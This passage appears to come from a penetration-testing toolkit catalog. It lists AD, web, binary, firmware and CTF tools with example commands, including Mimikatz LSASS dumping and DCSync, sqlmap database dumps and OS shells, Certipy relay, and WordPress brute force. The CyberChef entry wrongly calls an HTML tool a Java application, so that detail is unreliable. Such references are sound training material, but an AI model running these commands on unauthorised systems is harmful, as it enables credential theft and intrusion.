- Zone: active-directory | Category: active-directory | Type: framework
- OS: windows
- Purpose: Active Directory enumeration with PowerShell
- Tags: active-directory, enumeration, powershell, domain
- Install (kali): Download from PowerSploit GitHub
- Path: /home/saad/Desktop/cpent-toolkit/03-active-directory/PowerSploit/PowerSploit/Recon/PowerView.ps1
- Notes: Import-Module .\PowerView.ps1 in PowerShell [toolkit-synced]
- Commands (2):
  - **Get domain users**: `Get-DomainUser * -Properties samaccountname,description,pwdlastset | Select-Object -First 20`
    - When: From a domain-joined Windows machine
    - Output: List of domain users with properties
  - **Find domain admins**: `Get-DomainGroupMember 'Domain Admins' -Recursive`
    - When: To identify high-value accounts
    - Output: Members of Domain Admins group
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodhound, certipy, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute

#### mimikatz — Mimikatz
- Zone: active-directory | Category: active-directory | Type: cracker
- OS: windows
- Purpose: Credential extraction from Windows memory
- Tags: active-directory, credentials, hashing, memory, passwords
- Install (kali): Download from Benjamin Delpy GitHub
- Path: /usr/bin/mimikatz
- Notes: Run on Windows target, not Kali
- Commands (2):
  - **Dump credentials from LSASS**: `privilege::debug
sekurlsa::logonpasswords
exit`
    - When: From an elevated command prompt on Windows
    - Output: Plaintext passwords and NTLM hashes from memory
  - **Dump domain hashes (DCSync)**: `lsadump::dcsync /domain:TARGET_DOMAIN /user:Administrator
exit`
    - When: When you have DA privileges or replication rights
    - Output: NTLM hash of specified user
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, always-install-elevated, asrep-roasting
- Related Tools: 10 — bloodhound, certipy, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, ldapsearch

#### certipy — Certipy
- Zone: active-directory | Category: active-directory | Type: framework
- OS: linux
- Purpose: Active Directory Certificate Services enumeration and exploitation
- Tags: active-directory, certificate, esc, adcs, authentication
- Install (kali): pip3 install certipy-ad
- Path: /usr/bin/certipy
- Notes: Pre-installed on Kali
- Commands (2):
  - **Enumerate CA and templates**: `certipy find -u USER@TARGET_DOMAIN -p PASSWORD -dc-ip TARGET_IP`
    - When: When AD CS is present in the environment
    - Output: CA info, templates, and ESC vulnerabilities
  - **ESC8 attack (relay to HTTP)**: `certipy relay -target http://CA_SERVER -ca 'CA_NAME'`
    - When: When HTTP Web Enrollment is enabled
    - Output: Certificate for escalation to DA
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, buffer-overflow
- Related Tools: 10 — bloodhound, certify, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, ldapsearch

#### burp-suite — Burp Suite
- Zone: web | Category: web | Type: proxy
- OS: linux, windows, macos
- Purpose: Web application security testing proxy
- Tags: web, proxy, testing, owasp, api
- Install (kali): Download from PortSwigger
- Path: /usr/bin/burpsuite
- Notes: Community edition is free
- Commands (2):
  - **Start Burp Suite with project**: `burpsuite --project-file=test.burp`
    - When: Before testing a web application
    - Output: Burp Suite GUI with proxy on 127.0.0.1:8080
  - **Launch Burp Suite with proxy**: `java -jar burpsuite_community.jar --proxy-port=8080`
    - When: Starting Burp Suite for web application testing
    - Output: Burp Suite UI with proxy listener on 8080
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata, tech:csrf, tech:idor
- Related Tools: 10 — cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, lfisuite, liffy

#### sqlmap — SQLMap
- Zone: web | Category: web | Type: exploitation
- OS: linux, windows, macos
- Purpose: Automatic SQL injection detection and exploitation
- Tags: web, sqli, injection, database, automation
- Install (kali): sudo apt install -y sqlmap
- Path: /usr/bin/sqlmap
- Notes: Pre-installed on Kali
- Commands (3):
  - **Test GET parameter for SQL injection**: `sqlmap -u 'http://TARGET_URL/page?id=1' --batch --level=3 --risk=3`
    - When: When you suspect SQL injection in a URL parameter
    - Output: Database type, tables, and data
  - **Dump all databases**: `sqlmap -u 'http://TARGET_URL/page?id=1' --dump-all --batch`
    - When: After confirming SQL injection vulnerability
    - Output: All database contents
  - **OS shell via SQL injection**: `sqlmap -u 'http://TARGET_URL/page?id=1' --os-shell`
    - When: When the database user has file privileges
    - Output: Interactive OS shell
- Related Techniques: 15 — buffer-overflow, burp-workflow, cmdi-advanced, default-creds-iot, file-inclusion, firmware-cgi-injection, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, lfisuite

#### gobuster — Gobuster
- Zone: web | Category: web | Type: scanner
- OS: linux, windows, macos
- Purpose: Directory and file brute forcing
- Tags: web, directory, brute-force, recon, files
- Install (kali): sudo apt install -y gobuster
- Path: /usr/bin/gobuster
- Notes: Pre-installed on Kali
- Commands (2):
  - **Brute force directories**: `gobuster dir -u http://TARGET_URL -w /usr/share/wordlists/dirb/common.txt -x php,html,txt`
    - When: When you need to discover hidden directories and files
    - Output: List of discovered paths and status codes
  - **DNS subdomain brute force**: `gobuster dns -d TARGET_DOMAIN -w /usr/share/wordlists/subdomains.txt -t 50`
    - When: When DNS zone transfer fails and passive recon is insufficient
    - Output: Discovered subdomains with IPs
- Related Techniques: 15 — burp-workflow, cmdi-advanced, dns-enumeration, file-inclusion, lfi-advanced, passive-recon, password-spraying, sql-injection, ssrf, tech:broken-access-control
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, jwt_tool, lfisuite, liffy

#### ffuf — FFUF
- Zone: web | Category: web | Type: scanner
- OS: linux, macos, windows
- Purpose: Fast web fuzzer for content discovery
- Tags: web, fuzzing, directory, parameter, vhost
- Install (kali): sudo apt install -y ffuf
- Path: /usr/bin/ffuf
- Notes: Pre-installed on Kali
- Commands (2):
  - **Directory discovery**: `ffuf -u http://TARGET_URL/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404`
    - When: When brute forcing directories on a web server
    - Output: Valid paths with HTTP status codes
  - **Virtual host discovery**: `ffuf -u http://TARGET_IP -H 'Host: FUZZ.TARGET_DOMAIN' -w /usr/share/wordlists/subdomains.txt -fc 404`
    - When: When identifying virtual hosts on a shared server
    - Output: Valid virtual hosts
- Related Techniques: 15 — arp-discovery, burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata, tech:csrf
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, feroxbuster, git-dumper, gobuster, jwt_tool, lfisuite, liffy

#### wpscan — WPScan
- Zone: web | Category: web | Type: scanner
- OS: linux, macos
- Purpose: WordPress vulnerability scanner
- Tags: web, wordpress, cms, vulnerability, scanning
- Install (kali): sudo apt install -y wpscan
- Path: /usr/bin/wpscan
- Notes: Pre-installed on Kali; get API token from wpscan.com
- Commands (2):
  - **Enumerate WordPress version and plugins**: `wpscan --url http://TARGET_URL -e vp,vt,u`
    - When: When a WordPress site is identified
    - Output: WordPress version, vulnerable plugins, and users
  - **Brute force login**: `wpscan --url http://TARGET_URL -U admin -P /usr/share/wordlists/rockyou.txt`
    - When: When user enumeration is successful
    - Output: Valid credentials if found
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata, tech:csrf, tech:idor
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, lfisuite

#### nuclei — Nuclei
- Zone: web | Category: web | Type: scanner
- OS: linux, macos, windows
- Purpose: Fast vulnerability scanner based on templates
- Tags: web, vulnerability, scanning, template, automation
- Install (kali): sudo apt install -y nuclei
- Path: /usr/bin/nuclei
- Notes: Pre-installed on Kali
- Commands (2):
  - **Scan target with critical and high templates**: `nuclei -u http://TARGET_URL -t ~/nuclei-templates/ -severity critical,high`
    - When: When comprehensive vulnerability scanning is needed
    - Output: List of matched vulnerabilities with severity
  - **Scan URLs for critical CVEs**: `nuclei -l urls.txt -t cves/ -severity critical,high -o results.txt`
    - When: Quick CVE sweep against discovered hosts
    - Output: List of matched vulnerabilities saved to file
- Related Techniques: 15 — adcs-esc4, burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, metasploit-exploitation, rbcd-attack, sql-injection, ssrf, tech:broken-access-control
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, lfisuite

#### feroxbuster — Feroxbuster
- Zone: web | Category: web | Type: scanner
- OS: linux, macos, windows
- Purpose: Fast directory and file brute forcing with recursion
- Tags: web, directory, brute-force, recursion, recon
- Install (kali): sudo apt install -y feroxbuster
- Path: /usr/bin/feroxbuster
- Notes: Pre-installed on Kali
- Commands (2):
  - **Recursive directory discovery**: `feroxbuster -u http://TARGET_URL -w /usr/share/wordlists/dirb/common.txt -r -d 3`
    - When: When deep directory enumeration is needed
    - Output: Discovered paths with recursive results
  - **Recursive directory fuzzing with extensions**: `feroxbuster -u TARGET_URL -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt`
    - When: Deep recursive enumeration of web directories
    - Output: Discovered paths and files with extensions
- Related Techniques: 15 — burp-workflow, cmdi-advanced, dns-enumeration, file-inclusion, hashcat-attacks, ipv6-mitm, lfi-advanced, passive-recon, password-spraying, sql-injection
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, ffuf, git-dumper, gobuster, jwt_tool, lfisuite, liffy

#### nikto — Nikto
- Zone: web | Category: web | Type: scanner
- OS: linux, windows
- Purpose: Web server vulnerability scanner
- Tags: web, scanning, vulnerability, servers
- Install (kali): sudo apt install -y nikto
- Path: /usr/bin/nikto
- Notes: Pre-installed on Kali
- Commands (2):
  - **Scan web server for vulnerabilities**: `nikto -h http://TARGET_IP`
    - When: After identifying a web server
    - Output: List of vulnerabilities, misconfigurations, and dangerous files
  - **Web server vulnerability scan**: `nikto -h TARGET_URL -port 443 -ssl -output nikto_results.html -Format htm`
    - When: Quick web server misconfiguration scan
    - Output: HTML report of found issues
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata, tech:csrf, tech:idor
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, lfisuite

#### gdb — GDB with pwndbg
- Zone: binary-exploitation | Category: binary-exploitation | Type: debugger
- OS: linux
- Purpose: Binary debugging with exploitation-focused enhancements
- Tags: binary, debugging, exploitation, reverse-engineering, gdb
- Install (kali): sudo apt install -y gdb
- Path: /usr/bin/gdb
- Notes: Pre-installed on Kali
- Commands (2):
  - **Debug binary with pwndbg**: `gdb -q ./vulnerable-binary`
    - When: When analyzing a binary for exploitation
    - Output: pwndbg prompt with enhanced visualization
  - **Set breakpoint and run**: `break main
run AAAA`
    - When: At the start of analysis
    - Output: Breakpoint hit, showing stack and registers
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, default-creds-iot, format-string, format-string-exploit, got-overwrite, hashcat-attacks, heap-double-free, heap-fastbin-dup
- Related Tools: 10 — angr, checksec, file, gdb-multiarch, gef, ghidra, libc-database, nasm, objdump, one_gadget

#### pwntools — Pwntools
- Zone: binary-exploitation | Category: binary-exploitation | Type: framework
- OS: linux
- Purpose: CTF framework and exploit development library
- Tags: binary, exploitation, python, ctf, automation
- Install (kali): pip3 install pwntools
- Path: /home/saad/.local/bin/pwn
- Notes: Python3 library
- Commands (2):
  - **Interactive exploit script template**: `from pwn import *
p = remote('TARGET_IP', PORT)`
    - When: When developing a remote exploit script
    - Output: Interactive connection to target for exploit development
  - **Generate cyclic pattern**: `python3 -c 'from pwn import *; print(cyclic(200))'`
    - When: When finding crash offset in fuzzing
    - Output: Cyclic pattern for offset calculation
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, crypto-analysis, default-creds-iot, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup
- Related Tools: 10 — ROPgadget, angr, checksec, file, gdb, gdb-multiarch, gdb-peda, gef, ghidra, libc-database

#### ropper — Ropper
- Zone: binary-exploitation | Category: binary-exploitation | Type: analyzer
- OS: linux, windows
- Purpose: ROP gadget finder and binary analysis
- Tags: binary, rop, gadgets, exploitation
- Install (kali): pip3 install ropper
- Path: /home/saad/.local/bin/ropper
- Notes: Python3 library
- Commands (2):
  - **Find ROP gadgets**: `ropper -f ./binary --search 'pop r?; ret'`
    - When: When building ROP chains for bypassing protections
    - Output: ROP gadgets matching the search pattern
  - **Search for ROP gadgets**: `ropper --file BINARY --search "pop rdi"`
    - When: Finding gadgets for ROP chain construction
    - Output: List of matching gadget addresses and instructions
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, crypto-analysis, default-creds-iot, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup
- Related Tools: 10 — angr, checksec, file, gdb, gdb-multiarch, gef, ghidra, libc-database, nasm, objdump

#### one_gadget — One Gadget
- Zone: binary-exploitation | Category: binary-exploitation | Type: analyzer
- OS: linux
- Purpose: Find one-shot RCE gadgets in libc
- Tags: binary, libc, exploitation, rop, shell
- Install (kali): sudo apt install -y ruby && gem install one_gadget
- Path: /usr/bin/one_gadget
- Notes: Requires Ruby
- Commands (2):
  - **Find one-shot gadgets**: `one_gadget /lib/x86_64-linux-gnu/libc.so.6`
    - When: When you have a libc leak and need a reliable exploitation path
    - Output: One-shot RCE addresses with constraints
  - **Find libc one-gadget RCE**: `one_gadget /lib/x86_64-linux-gnu/libc.so.6 -b LEAKED_LIBC_BASE`
    - When: Finding single-instruction RCE in libc
    - Output: One-gadget addresses with constraint requirements
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, cmdi-advanced, default-creds-iot, file-inclusion, firmware-cgi-injection, format-string, format-string-exploit, got-overwrite
- Related Tools: 10 — angr, checksec, file, gdb, gdb-multiarch, gef, ghidra, libc-database, nasm, objdump

#### checksec — Checksec
- Zone: binary-exploitation | Category: binary-exploitation | Type: analyzer
- OS: linux
- Purpose: Check binary security protections
- Tags: binary, security, protections, analysis
- Install (kali): sudo apt install -y checksec
- Path: /usr/bin/checksec
- Notes: Pre-installed on Kali
- Commands (2):
  - **Check binary protections**: `checksec --file=./vulnerable-binary`
    - When: At the start of binary analysis
    - Output: Binary security protection status
  - **Check binary protections as JSON**: `checksec --file=BINARY --output=json`
    - When: Programmatically checking binary security properties
    - Output: JSON output of RELRO, Canary, NX, PIE status
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, crypto-analysis, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 10 — angr, file, gdb, gdb-multiarch, gef, ghidra, libc-database, nasm, objdump, one_gadget

#### radare2 — Radare2
- Zone: binary-exploitation | Category: binary-exploitation | Type: analyzer
- OS: linux, windows, macos
- Purpose: Reverse engineering framework and binary analysis
- Tags: binary, reverse-engineering, analysis, disassembly
- Install (kali): sudo apt install -y radare2
- Path: /usr/bin/radare2
- Notes: Pre-installed on Kali
- Commands (2):
  - **Analyze binary and enter visual mode**: `r2 -A ./vulnerable-binary`
    - When: When performing static analysis of a binary
    - Output: Visual disassembly with cross-references
  - **Radare2 in debug mode with analysis**: `r2 -d -A BINARY`
    - When: Debugging and analyzing a binary with radare2
    - Output: Radare2 debugger with auto-analyzed binary
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, crypto-analysis, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 10 — angr, checksec, file, gdb, gdb-multiarch, gef, ghidra, libc-database, nasm, objdump

#### binwalk — Binwalk
- Zone: iot-firmware | Category: iot-firmware | Type: analyzer
- OS: linux, macos
- Purpose: Firmware analysis and extraction tool
- Tags: iot, firmware, extraction, embedded, reverse-engineering
- Install (kali): sudo apt install -y binwalk
- Path: /usr/bin/binwalk
- Notes: Pre-installed on Kali
- Commands (2):
  - **Scan firmware for signatures**: `binwalk firmware.bin`
    - When: When analyzing a firmware image file
    - Output: List of embedded filesystems, kernels, and compression formats
  - **Extract firmware contents**: `binwalk -eM firmware.bin`
    - When: After scanning to extract embedded files
    - Output: Extracted filesystem and files in _firmware.bin.extracted
- Related Techniques: 12 — bootloader-bypass, crypto-analysis, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, iot-uart-debug, jtag-debugging, mqtt-attack, nvram-analysis
- Related Tools: 10 — arduino-cli, boofuzz, firmware-mod-kit, minicom, mosquitto-clients, mqtt-explorer, picocom, qemu, routersploit, sasquatch

#### firmware-mod-kit — Firmware Mod Kit
- Zone: iot-firmware | Category: iot-firmware | Type: framework
- OS: linux
- Purpose: Extract, modify, and repack firmware images
- Tags: iot, firmware, modification, extraction
- Install (kali): sudo apt install -y firmware-mod-kit
- Path: /usr/bin/extract-firmware.sh
- Notes: Pre-installed on Kali
- Commands (2):
  - **Extract firmware**: `extract-firmware.sh firmware.bin`
    - When: When binwalk fails to extract a firmware image
    - Output: Extracted filesystem and kernel
  - **Extract firmware with FMK**: `sudo ./extract-firmware.sh FIRMWARE.bin`
    - When: Extracting firmware using the firmware-mod-kit
    - Output: Extracted filesystem in output directory
- Related Techniques: 12 — bootloader-bypass, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, iot-uart-debug, jtag-debugging, mqtt-attack, nvram-analysis, spi-flash-dump
- Related Tools: 10 — arduino-cli, binwalk, boofuzz, minicom, mosquitto-clients, mqtt-explorer, picocom, qemu, routersploit, sasquatch

#### qemu — QEMU
- Zone: iot-firmware | Category: iot-firmware | Type: emulator
- OS: linux, macos
- Purpose: Emulate IoT device firmware for dynamic analysis
- Tags: iot, firmware, emulation, dynamic-analysis
- Install (kali): sudo apt install -y qemu-user-static qemu-user
- Path: /home/saad/Desktop/cpent-toolkit/06-iot-firmware/qemu
- Notes: Multiple architectures available [toolkit-synced]
- Commands (2):
  - **Run MIPS firmware in QEMU**: `qemu-system-mips -kernel vmlinux -hda rootfs.ext2 -append 'root=/dev/ram0' -nographic`
    - When: When emulating an extracted MIPS firmware
    - Output: Emulated firmware running in QEMU
  - **Run ARM binary with QEMU and filesystem**: `qemu-arm -L /path/to/extracted/filesystem BINARY`
    - When: Emulating ARM binaries with correct library paths
    - Output: Executes ARM binary on x86 host
- Related Techniques: 12 — bootloader-bypass, crypto-analysis, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, iot-uart-debug, jtag-debugging, mqtt-attack, nvram-analysis
- Related Tools: 10 — arduino-cli, binwalk, boofuzz, firmware-mod-kit, minicom, mosquitto-clients, mqtt-explorer, picocom, routersploit, sasquatch

#### sasquatch — Sasquatch
- Zone: iot-firmware | Category: iot-firmware | Type: analyzer
- OS: linux
- Purpose: Extract proprietary squashfs filesystem variants
- Tags: iot, firmware, extraction, squashfs, embedded
- Install (kali): sudo apt install -y sasquatch
- Path: /usr/bin/sasquatch
- Notes: Pre-installed on Kali
- Commands (2):
  - **Extract unsquashfs variant**: `sasquatch firmware.squashfs output_dir/`
    - When: When unsquashfs fails on a firmware filesystem
    - Output: Extracted squashfs contents
  - **Extract SquashFS with sasquatch**: `sasquatch FIRMWARE.bin -d ./output/`
    - When: Extracting non-standard SquashFS images
    - Output: Extracted filesystem in output directory
- Related Techniques: 11 — bootloader-bypass, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, iot-uart-debug, jtag-debugging, mqtt-attack, nvram-analysis, spi-flash-dump
- Related Tools: 10 — arduino-cli, binwalk, boofuzz, firmware-mod-kit, minicom, mosquitto-clients, mqtt-explorer, picocom, qemu, routersploit

#### cyberchef — CyberChef
- Zone: ctf | Category: ctf | Type: tool
- OS: linux, windows, macos
- Purpose: The Cyber Swiss Army Knife for encoding, encryption, and data analysis
- Tags: ctf, encoding, encryption, steganography, forensics
- Install (kali): Download from GitHub releases
- Path: /home/saad/Desktop/cpent-toolkit/ctf/CyberChef/CyberChef.html
- Notes: Java application, run with java -jar [toolkit-synced]
- Commands (2):
  - **Base64 decode in CyberChef**: `From Base64`
    - When: When you suspect data is Base64 encoded
    - Output: Decoded plaintext
  - **Rot13 / Caesar cipher**: `ROT13`
    - When: When you see garbled text that might be a Caesar cipher
    - Output: Decoded text shifted by 13
- Related Techniques: 3 — crypto-analysis, nvram-analysis, steganography
- Related Tools: 10 — exiftool, stegcracker, steghide, stegsolve, tool:autopsy, tool:exiftool, tool:pdfid, tool:sleuthkit, tool:strings, tool:volatility

#### stegsolve — Stegsolve
- Zone: ctf | Category: ctf | Type: analyzer
- OS: linux, windows, macos
- Purpose: Image steganography analysis with plane extraction
- Tags: ctf, steganography, images, forensics
- Install (kali): sudo apt install -y stegsolve
- Path: /home/saad/Desktop/cpent-toolkit/ctf/stegsolve
- Notes: Java application [toolkit-synced]
- Commands (2):
  - **Analyze image planes**: `java -jar stegsolve.jar image.png`
    - When: When you suspect hidden data in an image using steganography
    - Output: Visualization of different color planes revealing hidden content
  - **Analyze steganography with Stegsolve**: `java -jar Stegsolve.jar (manual: use Analyse > File Format, Analyse > Extract Files)`
    - When: When investigating suspected steganography in images
    - Output: Hidden data extracted or visualized
- Related Techniques: 7 — crypto-analysis, firmware-extraction, hashcat-attacks, ipv6-mitm, nvram-analysis, spi-flash-dump, steganography
- Related Tools: 10 — cyberchef, exiftool, stegcracker, steghide, tool:autopsy, tool:exiftool, tool:pdfid, tool:sleuthkit, tool:strings, tool:volatility

#### stegcracker — StegCracker
- Zone: ctf | Category: ctf | Type: cracker
- OS: linux, macos
- Purpose: Steganography brute force tool
- Tags: ctf, steganography, cracking, brute-force
- Install (kali): sudo apt install -y stegcracker
- Path: /usr/bin/stegcracker
- Notes: Pre-installed on Kali
- Commands (2):
  - **Brute force steghide password**: `stegcracker image.jpg /usr/share/wordlists/rockyou.txt`
    - When: When you know a file contains hidden data but don't have the password
    - Output: Extracted hidden file once password is cracked
  - **Crack steganography password**: `stegcracker IMAGE.jpg /usr/share/wordlists/rockyou.txt`
    - When: When steghide image is protected with password
    - Output: Cracked password and extracted data
- Related Techniques: 9 — asrep-roasting, crypto-analysis, hash-cracking, hashcat-attacks, heap-house-of-force, kerberoasting, password-spraying, steganography, tech:ntlm-cracking
- Related Tools: 4 — cyberchef, exiftool, steghide, stegsolve

#### exiftool — ExifTool
- Zone: ctf | Category: ctf | Type: analyzer
- OS: linux, windows, macos
- Purpose: Read, write, and edit metadata in files
- Tags: ctf, forensics, metadata, images, analysis
- Install (kali): sudo apt install -y exiftool
- Path: /usr/bin/exiftool
- Notes: Pre-installed on Kali
- Commands (2):
  - **Read all metadata from file**: `exiftool suspicious-file.jpg`
    - When: When analyzing files for hidden metadata
    - Output: Complete metadata including EXIF, comments, and hidden fields
  - **Extract metadata recursively**: `exiftool -r -ext jpg DIRECTORY/ | grep -i "GPS\|Author\|Software"`
    - When: Bulk metadata extraction from image directories
    - Output: GPS coordinates, author info, software versions
- Related Techniques: 4 — crypto-analysis, nvram-analysis, steganography, tech:cloud-metadata
- Related Tools: 10 — cyberchef, stegcracker, steghide, stegsolve, tool:autopsy, tool:exiftool, tool:pdfid, tool:sleuthkit, tool:strings, tool:volatility

#### enum4linux — enum4linux-ng
- Zone: active-directory | Category: active-directory | Type: enumerator
- OS: linux
- Purpose: Active Directory enumeration tool
- Tags: active-directory, enumeration, smb, rpc, ldap
- Install (kali): sudo apt install -y enum4linux
- Path: /usr/bin/enum4linux
- Notes: Pre-installed on Kali
- Commands (2):
  - **Full enumeration of target**: `enum4linux-ng -A TARGET_IP -oY enum_results`
    - When: When enumerating a Windows/Samba host
    - Output: Users, groups, shares, policies, and OS info in YAML
  - **Full unauthenticated enum with enum4linux-ng**: `enum4linux-ng -A -u '' -p '' TARGET_IP`
    - When: Comprehensive unauthenticated SMB enumeration
    - Output: Users, groups, shares, policies, and more
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodhound, bloodyad, certipy, crackmapexec, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute

#### smbmap — SMBMap
- Zone: network-enum | Category: network-enum | Type: enumerator
- OS: linux, windows
- Purpose: SMB share enumeration and permissions checking
- Tags: network-enum, smb, shares, enumeration, permissions
- Install (kali): sudo apt install -y smbmap
- Path: /usr/bin/smbmap
- Notes: Pre-installed on Kali
- Commands (2):
  - **Enumerate SMB shares**: `smbmap -H TARGET_IP -u '' -p ''`
    - When: When you have identified a host with SMB
    - Output: List of shares with read/write permissions
  - **Download file from share**: `smbmap -H TARGET_IP -u 'USER' -p 'PASS' --download '\\TARGET_IP\share\file.txt'`
    - When: When a readable share contains interesting files
    - Output: Downloaded file contents
- Related Techniques: 12 — arp-discovery, delegation-enum, dns-enumeration, kerberos-delegation-enum, ntlm-relay, pass-the-hash, password-spraying, smb-enumeration, snmp-enumeration, tech:port-forwarding
- Related Tools: 8 — arp-scan, ip, ls, netdiscover, onesixtyone, showmount, smbclient, snmpwalk

#### smbclient — SMBClient
- Zone: network-enum | Category: network-enum | Type: client
- OS: linux, windows
- Purpose: Access SMB shares from the command line
- Tags: network-enum, smb, shares, enumeration, client
- Install (kali): sudo apt install -y smbclient
- Path: /usr/bin/smbclient
- Notes: Part of Samba package
- Commands (2):
  - **List shares with null session**: `smbclient -L //TARGET_IP -N`
    - When: When checking for anonymous access to SMB shares
    - Output: List of shares available on the target
  - **Connect to share interactively**: `smbclient //TARGET_IP/share -N`
    - When: When you want to browse or download files from a share
    - Output: Interactive SMB shell for file operations
- Related Techniques: 15 — arp-discovery, c2-establishment, cmdi-advanced, delegation-enum, dns-enumeration, firmware-cgi-injection, iot-uart-debug, kerberos-delegation-enum, ntlm-relay, pass-the-hash
- Related Tools: 8 — arp-scan, ip, ls, netdiscover, onesixtyone, showmount, smbmap, snmpwalk

#### rpcclient — RPCClient
- Zone: active-directory | Category: active-directory | Type: client
- OS: linux
- Purpose: RPC client for Windows/Samba enumeration
- Tags: active-directory, rpc, enumeration, smb, windows
- Install (kali): sudo apt install -y rpcclient
- Path: /usr/bin/rpcclient
- Notes: Part of Samba package
- Commands (2):
  - **Enumerate domain users**: `rpcclient -U '' -N TARGET_IP -c 'enumdomusers'`
    - When: When performing unauthenticated SMB enumeration
    - Output: RID and username pairs for domain users
  - **Enumerate domain groups**: `rpcclient -U '' -N TARGET_IP -c 'enumdomgroups'`
    - When: When mapping out AD group structure
    - Output: RID and group name pairs
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, always-install-elevated, asrep-roasting
- Related Tools: 10 — adidnsdump, bloodhound, certipy, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute

#### ldapsearch — ldapsearch
- Zone: active-directory | Category: active-directory | Type: client
- OS: linux
- Purpose: LDAP directory search and enumeration
- Tags: active-directory, ldap, enumeration, directory
- Install (kali): sudo apt install -y ldap-utils
- Path: /usr/bin/ldapsearch
- Notes: Part of ldap-utils package
- Commands (2):
  - **Anonymous bind to enumerate rootDSE**: `ldapsearch -x -h TARGET_IP -s base namingcontexts`
    - When: When checking for anonymous LDAP binding
    - Output: Naming contexts (domains) available
  - **Enumerate all objects with credentials**: `ldapsearch -x -h TARGET_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=local' '(objectClass=*)'`
    - When: When you have LDAP credentials and want to dump the directory
    - Output: All directory objects and attributes
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodhound, bloodyad, certipy, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump

#### hashcat — Hashcat
- Zone: password-attacks | Category: password-attacks | Type: cracker
- OS: linux, windows
- Purpose: Advanced password recovery and hash cracking
- Tags: password-attacks, hashing, cracking, gpu, recovery
- Install (kali): sudo apt install -y hashcat
- Path: /usr/bin/hashcat
- Notes: Pre-installed on Kali; requires NVIDIA/AMD GPU for best performance
- Commands (2):
  - **Crack NTLM hashes**: `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt`
    - When: When you have NTLM hashes to crack
    - Output: Cracked passwords saved to file
  - **Crack Kerberoast hashes**: `hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt`
    - When: When you have Kerberos TGS hashes from Kerberoasting
    - Output:  cracked service account passwords
